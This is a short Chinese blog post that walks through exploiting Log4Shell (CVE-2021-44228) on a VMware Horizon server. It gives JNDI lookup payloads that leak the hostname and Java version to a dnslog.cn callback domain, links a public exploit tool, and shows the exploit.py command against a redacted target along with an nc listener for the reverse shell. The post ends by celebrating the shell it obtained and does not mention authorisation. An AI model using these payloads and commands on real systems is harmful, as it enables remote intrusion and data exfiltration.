---
title: VMWare Horizon 漏洞利用案例
date: 2023-09-15 18:53:00 +0800
img_path: /
categories: [肾透, 漏洞利用]
tags: [肾透, 漏洞利用]     
---

# VMWare Horizon 漏洞利用案例

## 前期测试



VMWare Horizon 存在 log4j2 CVE-2021-44228 漏洞

手动复现未果，直接当脚本小子上工具吧。有时候打不进去是因为工具不对！

漏洞利用工具：https://github.com/puzzlepeaches/Log4jHorizon

本次复现流程：

测试是否存在log4j(先利用DNSlog外带出一些基本信息)

 ${jndi:dns://${hostName}.rn6t7t.dnslog.cn}

${jndi:dns://${sys:java.version}.rn6t7t.dnslog.cn}

![image-20230915230059796](assets/image-20230915230059796.png)

## 攻击过程

攻击机：

```python3
python3 exploit.py -r -t xxx.xxx.com -p 9001 -i vps
```

监听：

```bash
nc -lvvp 9001
```

先开启监听9001端口

![image-20230915230437510](assets/image-20230915230437510.png)

利用攻击脚本：

![image-20230915230504022](assets/image-20230915230504022.png)

接收到shell：

![image-20230915230550477](assets/image-20230915230550477.png)

《上号！》
